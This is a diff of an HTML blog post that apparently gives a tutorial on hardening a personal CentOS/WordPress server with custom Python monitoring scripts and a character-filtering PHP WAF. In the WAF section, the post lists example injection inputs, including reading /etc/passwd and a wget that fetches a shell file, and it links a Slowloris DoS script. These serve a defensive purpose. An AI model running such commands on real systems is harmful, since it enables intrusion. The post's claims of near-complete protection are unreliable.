@@ -92,6 +92,7 @@
   <li><a href="/">Blog</a></li>
   <li><a href="/blog/archives">Archives</a></li>
   <li><a href="/intro">Intro</a></li>
+  <li><a href="/dudes">Dudes</a></li>
   <li><a href="mailto:Ali[dot]Razmjoo1994[at]Gmail[at]Com">Contact</a></li>
 
 </ul>
@@ -125,20 +126,19 @@
   </header>
 
 
-<div class="entry-content"><p>When security researchers and hackers want to setup a self blog the biggest stress on their brain is what to do for secure their server and site. what if someone come and naughty their servers ? what if server get DDOS attack when they don’t have access to fix up their server and they are outside on travel or maybe with their girl friend ? o.O first mistake , Hackers , Geeks , Programmers and security researchers often don’t have girl friend so we skip this reason and replace it with maybe they go for business or something and they cann&rsquo;t access their server for some reason. After some years that I spent my life on information security I release that nothing cannot be secure 100% , But We shouldn&rsquo;t give it up and let others naughty our server and deface our website or maybe make a botnet zombie for DDOS Attack. In past year I decision to do something to remove this stress on my self or make it less and I start to make a mini firewall or something like Robot for secure my server because I don’t trust other firewalls. 99% of firewalls bypass easy and it’s really ridicule that big firewalls from big company mostly skip checking the packets on POST requests. So it’s first reason I decision to secure my server by my own scripts, So keep reading to know more.</p>
+<div class="entry-content"><p>When security researchers and hackers want to setup a self blog the biggest stress on their brain is what to do for secure their server and site. what if someone come and naughty their server(s) ? what if server get <a href="http://en.wikipedia.org/wiki/Denial-of-service_attack">DOS</a>/<a href="http://www.techopedia.com/definition/10261/distributed-denial-of-service-ddos">DDOS</a> attack when they don’t have access to fix up their server(s) and they are outside on travel or maybe with their girl friend !? o.O first mistake , Hackers , Geeks , Programmers and security researchers often don’t have girl friend so we skip this reason and replace it with maybe they go for business or something and they cann&rsquo;t access their server(s) for some reason. After some years that I spent my life on information security I release that nothing cannot be secure 100% , But We shouldn&rsquo;t give it up and let others naughty our server and deface our website or maybe make us a botnet zombie for DOS/DDOS Attack. In past year I decision to do something to remove this stress on my self or make it less and I start to make a mini firewall or something like Robot for secure my server and sure I don’t trust other firewalls. 99% of firewalls bypass easy and it’s really ridicule that firewalls from big companies mostly skip checking the packets on POST requests. So that&rsquo;s first reason I decision to secure my server by my own scripts, and if you want to know more , keep reading.</p>
 
 <!-- more -->
 
 
-<p>At first We must to know , what do we have and what do we want? my first decision to secure my website is that I build my website on my own VPS and don&rsquo;t share VPS with anyone else, so Don’t use a share hosting for your site if it’s important for you and by the way this method I want to talk about cann&rsquo;t be use for share hosting and it will make you in trouble if you share your VPS with someone else. Second decision is choose a operation system and a website platform for yourself, I chosen CentOS for my Server OS and WordPress for my blogging. Notice , you can choose anything but after you read this article you must to know how edit source codes and match them with other website platform or OS. By the way I get a VPS that have a Console Access [Hardware Access + Emergency SSH or Emergency VNC] and I install a Panel [ For Example <a href="http://cpanel.net/">CPanel X (WHM/CPANEL)</a> ] and panel installer will automatically install anything  that need to be install on Server. That was first Step for lazy guys and if you like , you can install anything you need with terminal on SSH or anyway you like. Just setup your website and after That install your Wordpress [or anything you want]. Okay Here we go. Now what you need to Secure:
-<br>1- WebServer
+<p>At first We must to know , what do we have and what do we want? my first decision to secure my website is that I build my website on my own VPS and don&rsquo;t share VPS with anyone else, so Don’t use a share hosting for your site if it’s important for you and by the way this method I want to talk about cann&rsquo;t be use for share hosting and it will make you in trouble if you share your VPS with someone else. Second decision is choose a operation system and a website platform for yourself, I chosen CentOS for my Server OS and WordPress for my blogging. Notice , you can choose anything , But after you read this article you must to know how edit source codes and match them with other website platform or OS. By the way I get a VPS that have a Console Access [Hardware Access + Emergency SSH or Emergency VNC] and I install a Panel [ For Example <a href="http://cpanel.net/">CPanel X (WHM/CPANEL)</a> ] and panel installer will automatically install anything  that need to be install on Server. That was first Step for lazy guys and if you like , you can install anything you need with terminal on SSH or anyway you like. Just setup your website and after That install your Wordpress [or anything you want]. Okay Here we go. Now what you need to Secure:<br><br>1- WebServer
 <br>2- Your Blogging(or maybe forum or &hellip;) Platform
 <br>3- PHP
 <br>4- Set Permissions
 <br>5- Make a Mini Robot And a mini WAF
 <br>6- Other Service if you use [For Example SSH , I will explain this in at the end of this article]</p>
 
-<p>For begining I&rsquo;ve to say i don&rsquo;t want to teach from begining of securing or config server so you most have little knowlage when you reading this article and for secure your Webserver if you using Apache [httpd] you really need to install <a href="http://blog.secaserver.com/2011/08/protect-apache-slowloris-attack/">Anti Slowloris</a> first. Maybe you hear <a href="http://ha.ckers.org/slowloris/slowloris.pl">Slowloris</a> before it&rsquo;s a <a href="http://ha.ckers.org/slowloris/slowloris.pl">DDOSER Script</a>  and easily can take down the Apache webserver. So now how to install This ?
+<p>For start I&rsquo;ve to say i don&rsquo;t want to teach from begining of securing or config server so you most have little knowlage when you reading this article.For protect your webserver from DOS/DDOS attack if you using Apache [httpd] [Apache webserver is just a example] you really need to install <a href="http://blog.secaserver.com/2011/08/protect-apache-slowloris-attack/">Anti Slowloris</a> first. Maybe you hear <a href="http://ha.ckers.org/slowloris/slowloris.pl">Slowloris</a> before it&rsquo;s a <a href="http://ha.ckers.org/slowloris/slowloris.pl">DOS/DDOS Script</a> for attack on Apache webserver and easily can take down the Apache webserver [I dont want to talk about how this script work so dont need explain much about it]. So now how to install This ?
 <br>Fallow these commands:</p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
@@ -180,9 +180,9 @@
 <p>The next step for config your webserver ,You need to off the webserver signature to don&rsquo;t get others much information about webserver modules.
 so find the httpd.conf and then open it and search the &ldquo;ServerSignature On&rdquo; , replace with &ldquo;ServerSignature Off&rdquo; and add &ldquo;ServerTokens Prod&rdquo; or &ldquo;ServerTokens Email&rdquo; [Webmaster or Admin Email].</p>
 
-<p>For next Step is Disable the CGI and Directory Listing and you need to Add &ldquo;Options  -Indexes -ExecCGI &hellip;&rdquo; , If you do it before you know how to add these and if not beginners can learn from this <a href="http://www.petefreitag.com/item/505.cfm">URL</a>.</p>
+<p>For next Step is Disable the CGI and Directory Listing and you need to Add &ldquo;Options  -Indexes -ExecCGI &hellip;&rdquo; , If you do it before you know how to do these things and if not , Beginners can learn from this <a href="http://www.petefreitag.com/item/505.cfm">URL</a>.</p>
 
-<p>Notice: In that url I shared for beginners said about &ldquo;mod_security&rdquo; and I suggest you don&rsquo;t install or active it, sometimes it&rsquo;s not good for poor servers and in DDOS attacks it will help for make website go offline [On Crash or Use much system processing].</p>
+<p>Notice: In that url I shared for beginners said about &ldquo;mod_security&rdquo; and I suggest you don&rsquo;t install or active it, sometimes it&rsquo;s not good for poor servers and in DDOS attacks it gonna help for make website go offline [Effect on crash or use much system processing].</p>
 
 <p>And now PHP config time,  all you need is set some disable functions and turn on safe mode and disable errors to not show path and user, and other one is to disallow url opening with fopen.
 I just made a list for disable function you can use it.</p>
@@ -192,9 +192,9 @@ I just made a list for disable function you can use it.</p>
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>and  beginners can check <a href="http://www.madirish.net/199">HERE</a> for how to do things I said.</p>
+<p>and  beginners can check <a href="http://www.madirish.net/199">HERE</a> for getting help and learn how to do these things.</p>
 
-<p>Until now anything I said was simple and not any special things and also maybe easy to bypass, But don’t hurry up. let me explain more and then we continue. With that disable functions and php config we disabled the RCE vulnerabilities and something more that you know they appear with those functions, And now first copy this python script in your public_html and run it. It’s going to change file and folder permissions [remove write permission]. So after you setup your website and finish you must close write permission on every folder and files in public_html. On this way no one cannot upload anything on your website and if you want to upload anything you have to upload on database or if want to upload in the public_html folder you must open permission for seconds and upload your files and close it again, Now We know that uploading and file wrting begin disable on our server in easy way.</p>
+<p>Until now anything I said was simple and not any special things and also maybe easy to bypass, But don’t hurry up. let me explain more and then we continue. With that disable functions and php config we disabled the RCE vulnerabilities and something more that you know they appear with those functions, And now, Copy this python script in your public_html folder and run it. It’s going to change file and folder permissions [remove write permission]. After you setup your website and finish you must close write permission on every folder and files in public_html. On this way no one cannot upload anything on your website and if you want to upload anything you have to upload on database or if want to upload in the public_html folder you must open permission for seconds and upload your files and close it again, Now We know that uploading and file wrting begin disable on our server in easy way.</p>
 
 <figure class='code'><figcaption><span>Perm.py</span><a href='https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/perm.py'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -228,11 +228,13 @@ I just made a list for disable function you can use it.</p>
 <p>Note: This script set 555 permission for folders and 444 for files.
 <br>Note: All scripts not coded in professional coding mode so take it easy. I wrote them so fast.</p>
 
-<p>Now it’s time for our little baby robot. What does it have to do for us? How does it work? I made a mini robot that add a service named “zeroday” in your OS [Linux base] and then open some Subprocess and start working , what’s his job ?
-<b>1- Check for DDOS attack from inside and outside
+<p>Now it’s time for our little baby robot. What does it have to do for us? How does it work? I made a mini robot that add a service named “zeroday” in your OS [Linux base] and then open some Subprocess and start working , what’s his job ?</p>
+
+<p><b>1- Check for DOS/DDOS attack from inside and outside
 <br>2- Check MD5 for public_html files
-<br>And now about source codes and explain. first you must create file with name “zeroday” in /etc/init.d/ zeroday is begin your service name. [work with command “service zeroday start/stop”] and here is sourcode code
-<br>Note: You can choose a different service name [&lsquo;zeroday&rsquo; or anything you like]</p>
+<br>
+<br>And now about source codes and explain. At first you must create file with name “zeroday” in /etc/init.d/ zeroday is begin your service name. [work with command “service zeroday start/stop”] and here is sourcode code.
+<br>Note: You can choose a different service name [&lsquo;zeroday&rsquo; or anything you like].</p>
 
 <figure class='code'><figcaption><span>zeroday</span><a href='https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/zeroday'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -312,9 +314,9 @@ I just made a list for disable function you can use it.</p>
 
 
 <p>kill.py execute when we want stop robot[service].
-<br>Note: You must create these files in same directory or change directory in service bash script.
+<br><br>Note: You must create these files in same directory or change directory in service bash script.
 <br>Note: As you see in line 12 , we must install &lsquo;start-stop-daemon&rsquo; so download and install it.
-<br>Daemon Download:</p>
+<br><br>Download Daemon tools:</p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -327,7 +329,7 @@ I just made a list for disable function you can use it.</p>
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>And if you get any error, you don&rsquo;t have gcc so:</p>
+<p>And if you get any error, or you don&rsquo;t have gcc:</p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -340,7 +342,7 @@ I just made a list for disable function you can use it.</p>
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>And daemon installed.<br>
+<p>And daemon installed.<br><br>
 Now the main python file for start all subprocess together.
 source code :</p>
 
@@ -387,7 +389,7 @@ source code :</p>
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>Note: Copy it in /root/ directory, If you want change directory, Don&rsquo;t forget to change it in source codes too.
+<p>Note: Copy this script in /root/ directory, If you want change directory, Don&rsquo;t forget to change it in source codes too.
 <br>and other files you need to have in root directory:</p>
 
 <figure class='code'><figcaption><span>24ban.py</span><a href='https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/24ban.py'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
@@ -466,9 +468,9 @@ source code :</p>
 <p>Note: Change exceptions IP to anything you want.
 <br>Note: This file find the IPs that have much threads on server and it going to block them.
 <br>Note: You can see block IPs in /root/Banned.txt
-<br>Note: This script will check your server every 120 seconds. Why ? Maybe someone trying to do DDOS attack but attack not begin success yet. So it will check and block them too.
+<br>Note: This script will check your server every 120 seconds. Why ? Maybe someone trying for DOS/DDOS attack but attack not begin success yet. So it will check and block them too.
 <br><br>
-This file will check the MD5 of public_html files and folders and if any file or folder change/add/remove Robot will Stop Apache. So you cannot be deface.</p>
+This file will check the MD5 of public_html files and folders, If any file or folder change/add/remove Robot will Stop Apache. So you cannot be deface.</p>
 
 <figure class='code'><figcaption><span>md5.py</span><a href='https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/md5.py'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -598,7 +600,7 @@ This file will check the MD5 of public_html files and folders and if any file or
 
 
 <p>
-<br><br><br>This file is going to run and ban IPs requested by Robot.</p>
+<br>This file is going to run and ban IPs requested by Robot.</p>
 
 <figure class='code'><figcaption><span>ban.py</span><a href='https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/ban.py'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -947,8 +949,8 @@ This file will check the MD5 of public_html files and folders and if any file or
 <p>Next step you have to replace php file link address in out.py at line 8. And now it&rsquo;s working now.</p>
 
 <p>And now about that php file , you should replace your primary word to your site name or title and then upload it on other host [you can also use free hosting as i said before] and now your service working well.
-So until now your server files if change , this robot will stop Apache webserver so it mean no one cannot upload any badware [ shell scripts or anything ] on your website or deface your website or if any ddos attack or crashing happen it will ban attacker(s) IP and restart Apache webserver. this robot need to develop for working more easy and if I get more free time I&rsquo;ll improve this and make it easy to work.
-but now , about other 0day Vulnerabilities on wordpress or plugins. so we need filter something on GET and POST Requests. If you think I want start listing words same</p>
+<br><br>So until now your server files if change , this robot will stop Apache webserver so it mean no one cannot upload any badware [ shell scripts or anything ] on your website or deface your website or if any DOS/DDOS attack or crashing happen it will ban attacker(s) IP and restart Apache webserver. this robot need to develop for working more easy and if I get more free time I&rsquo;ll improve this and make it easy to work.
+<br><br>But now , about other 0day Vulnerabilities on wordpress or plugins [Or any CMS you used] , We need to filter something on GET and POST Requests but if you think I want start listing words same</p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -969,16 +971,17 @@ but now , about other 0day Vulnerabilities on wordpress or plugins. so we need f
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>your are so wrong because it&rsquo;s so ridicules and it bypass easy so the best way it&rsquo;s filter these characters</p>
+<p>You are so wrong, because it&rsquo;s so ridicules and it bypass easy so the best way it&rsquo;s filter these characters</p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class='html'><span class='line'>!@#$%^<span class="ni">&amp;*()_+=-\|}{[]:&quot;?&gt;&lt;;</span>&#39;/.,
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>if we filter these characters most vulnerabilities will disable
+<p>Note: I said filter GET and POST, It&rsquo;s just a example for inputs.<br><br>
+if we filter these characters most vulnerabilities will disable
 Examples:
-RCE:</p>
+<br>RCE:</p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -987,7 +990,7 @@ RCE:</p>
 <span class='line-number'>5</span>
 <span class='line-number'>6</span>
 <span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">cat</span> <span class="o">/</span><span class="nx">etc</span><span class="o">/</span><span class="nx">passwd</span>      <span class="o">=&gt;</span>  <span class="o">/</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">cat</span> <span class="o">/</span><span class="nx">etc</span><span class="o">/</span><span class="nx">passwd</span>      <span class="o">=&gt;</span>  <span class="o">/</span>     <span class="o">&lt;=</span>  <span class="k">This</span> <span class="nx">Char</span> <span class="nx">filtered</span> <span class="nx">by</span> <span class="nx">firewall</span>
 </span><span class='line'><span class="nx">ls</span> <span class="o">-</span><span class="nx">la</span>     <span class="o">=&gt;</span> <span class="o">-</span>
 </span><span class='line'><span class="k">echo</span> <span class="mi">1</span> <span class="o">&gt;</span> <span class="mi">1</span>   <span class="o">=&gt;</span>   <span class="o">&gt;</span>
 </span><span class='line'><span class="nx">wget</span> <span class="nx">http</span><span class="o">://</span><span class="nx">z3r0d4y</span><span class="o">.</span><span class="nx">com</span><span class="o">/</span><span class="nx">shell</span><span class="o">.</span><span class="nx">txt</span> <span class="o">=&gt;</span> <span class="o">://</span> <span class="o">.</span> <span class="o">.</span>
@@ -1028,7 +1031,8 @@ RCE:</p>
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>and more &hellip; See everything filtered by a simple way but you must add some exceptions! a method for handle exception is put wp-comments-post.php in white list and [we know it&rsquo;s not vulnerable] and users want to send comment so it must be in white list and deny all others but we shouln&rsquo;t filter admin requests in wordpress [for posts and other js and &hellip; requests] so we generate a random md5 or any primary words and we put in php WAF and use Firefox user agent switcher to add a user agent for managing your blog, so now just you have a primary key on your server and just you can send any request so handle it on wp-config.php enjoy your new mini POWERFUL WAF.</p>
+<p>and more &hellip;
+<br><br>See everything filtered by a simple way, But it&rsquo;s not all. Wordpress Admin panel and guest users need to send this chars. we should not block them from comment or block admin requests for send post or any jquery or java POSTs in admin panel. So we need a white list [Exception list] to Handle these. All you to do is put &ldquo;wp-comments-post.php&rdquo; file in white list for users comments and generate a random MD5 or any primary key for using on Admin user agent and handle in Exception. Then you can have your private key to be admin and login in admin panel, send your posts without any problem [My Suggestion is use Firefox UserAgent switcher Add-Ons]. Next Step is Handle your code in config.php and we done with our WAF.</p>
 
 <figure class='code'><figcaption><span>waf.php</span><a href='https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/waf.php'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -1213,7 +1217,7 @@ RCE:</p>
 
 <p>And last thing about other services same cpanel,ssh and &hellip; , you must set IP limits with iptables for all of their ports number OR stop their services if you don&rsquo;t need these, if you want to stop services don&rsquo;t forgot for start them again you need CONSOLE ACCESS and if you don&rsquo;t have console access , don&rsquo;t disable them. disabling services protect you from 0Day Vulnerabilities that they are not public yet.</p>
 
-<p>until now we protected our website from 0Day vulnerabilities and protected our server with a simple ways for ddos and deface or uploading.
+<p>until now we protected our website from 0Day vulnerabilities and protected our server with a simple ways for DOS/DDOS and deface or uploading.
 We didn&rsquo;t config any IDS or IPS professional mode But be sure with doing these on your server be sure you protected so much</p>
 
 <p>But at last if you are same me and very stressful , get a domain , install octopress blogging on your system and upload your site on <a href="http://pages.github.com/">github pages</a>, be safe more than any VPS. But It&rsquo;s not php and mysql hosting so it&rsquo;s limit but prefect for simple blogging.</p>
@@ -1224,6 +1228,8 @@ We didn&rsquo;t config any IDS or IPS professional mode But be sure with doing t
 <br>3- <a href="http://z3r0d4y.com">ZeroDay Cyber Research</a></p>
 
 <p><a href="mailto:Ali[dot]Razmjoo1994[at]Gmail[at]Com">Ali Razmjoo</a></p>
+
+<p><br><br>Last edit on: 2015/2/24 @18:41</p>
 </div>
 
 
